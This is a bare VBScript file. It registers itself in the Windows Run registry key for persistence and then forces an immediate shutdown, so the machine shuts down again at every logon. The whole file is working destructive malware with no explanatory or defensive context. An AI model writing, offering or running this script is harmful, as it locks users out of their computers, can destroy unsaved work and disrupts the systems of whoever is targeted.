dim fso,ws
set fso=CreateObject("Scripting.FileSystemObject")
set ws=CreateObject("wscript.shell")
set f=fso.getfile(wscript.scriptfullname)
ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&f.name,f.path
set ws=CreateObject("wscript.shell")
ws.run "shutdown -f -s -t 00",0 ,true